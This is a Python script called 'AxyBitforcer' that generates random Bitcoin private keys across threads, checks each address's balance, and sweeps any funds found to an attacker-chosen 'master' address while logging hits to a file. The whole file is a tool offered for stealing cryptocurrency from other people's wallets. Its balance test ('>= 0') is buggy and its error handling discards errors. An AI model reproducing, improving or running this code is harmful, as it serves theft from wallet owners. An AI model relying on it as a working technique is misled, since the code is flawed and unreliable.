from bitcoinaddress import Wallet
from bit import Key
from datetime import datetime
from threading import Thread
import os
import sys

def check_and_send(wif, master_address):
    try:
        wallet = Key(wif)
        if float(wallet.get_balance('btc')) >= 0:
            print(f"[!] > Checking {wallet.address} | Balance: {wallet.get_balance('btc')}")
            tx = wallet.send([], leftover=master_address, unspents=wallet.get_unspents())
            print(f"[!] ({datetime.now().replace(microsecond=0)}) > Balance found | {wallet.get_balance()} | {wallet.address}\n\nTransaction Hash: {tx}")
            with open("found.txt", "a") as found_file:
                found_file.write(f"{datetime.now().replace(microsecond=0)} | {wallet.segwit_address} | Balance: {wallet.get_balance()}")
        else:
            print(f"[!] ({datetime.now().replace(microsecond=0)}) > No balance found. Continuing...")
    except ValueError:
        print(f"[!] ({datetime.now().replace(microsecond=0)}) > No balance found. Continuing...")
    except KeyboardInterrupt:
        sys.exit("[!] > Goodbye!")
    except Exception:
        raise Exception
    
def generate(amount, thread_number, master_address):
    for i in range(0, amount):
        print(f"[!] ({datetime.now().replace(microsecond=0)}) Thread #{thread_number} | Address #{i} > Generating Wallet...")
        wallet = Wallet()
        print(f"[!] ({datetime.now().replace(microsecond=0)}) Thread #{thread_number} > Checking...")
        check_and_send(wallet.__dict__['key'].__dict__['mainnet'].__dict__['wif'], master_address)
    return 
    
    
if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    print("""
█████╗ ██╗  ██╗██╗   ██╗██████╗ ██╗████████╗███████╗ ██████╗ ██████╗  ██████╗███████╗██████╗ 
██╔══██╗╚██╗██╔╝╚██╗ ██╔╝██╔══██╗██║╚══██╔══╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗
███████║ ╚███╔╝  ╚████╔╝ ██████╔╝██║   ██║   █████╗  ██║   ██║██████╔╝██║     █████╗  ██████╔╝
██╔══██║ ██╔██╗   ╚██╔╝  ██╔══██╗██║   ██║   ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  ██╔══██╗
██║  ██║██╔╝ ██╗   ██║   ██████╔╝██║   ██║   ██║     ╚██████╔╝██║  ██║╚██████╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝   ╚═╝   ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝""")
    print("[!] > AxyBitforcer - Bitcoin address bruteforcer.")
    print("[!] > Amount of addresses to generate equals to Amount of addresses on each thread * Number of threads.")
    master_address = input("[?] > Address to send funds to: ")
    amount = int(input("[?] > How many addresses would you like to generate on each thread?: "))
    threads = int(input("[?] > How many threads would you like to run?: "))
    for i in range(0, threads):
        thread = Thread(target=generate, args=(amount, i, master_address)).start()
    
    
    
